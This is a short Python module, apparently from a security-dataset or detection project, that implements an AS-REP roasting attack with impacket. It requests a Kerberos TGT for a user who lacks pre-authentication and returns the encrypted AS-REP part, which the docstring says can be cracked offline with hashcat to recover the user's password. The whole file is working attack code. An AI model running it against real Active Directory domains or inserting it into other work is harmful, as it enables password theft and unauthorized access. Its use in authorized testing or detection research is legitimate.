"""AS-REP roasting attack tool, modeled on `datasets.splunk_ad_kerberos_loader`
patterns.

Requests a TGT with Kerberos pre-authentication disabled for a user that
has "Do not require Kerberos preauthentication" set, and returns the
AS-REP's encrypted part -- crackable offline (hashcat mode 18200) since
it's encrypted with a key derived from the user's own password. impacket
is imported lazily since it's a heavy dependency not needed to import
this module.
"""
from __future__ import annotations


def asrep_roast(target_host: str, domain: str, username: str = "") -> dict:
    if not username:
        raise ValueError("asrep_roast requires a target username")

    from pyasn1.codec.der import decoder as der_decoder

    from impacket.krb5 import constants
    from impacket.krb5.asn1 import AS_REP
    from impacket.krb5.kerberosv5 import getKerberosTGT
    from impacket.krb5.types import Principal

    client_principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL)
    as_rep_bytes, _cipher, _key, _session_key = getKerberosTGT(
        client_principal, "", domain, "", "", "", target_host, kerberoast_no_preauth=True
    )

    decoded = der_decoder.decode(as_rep_bytes, asn1Spec=AS_REP())[0]
    enc_part = decoded["enc-part"]

    return {
        "target_host": target_host,
        "domain": domain,
        "username": username,
        "etype": int(enc_part["etype"]),
        "as_rep_cipher_hex": bytes(enc_part["cipher"]).hex(),
    }
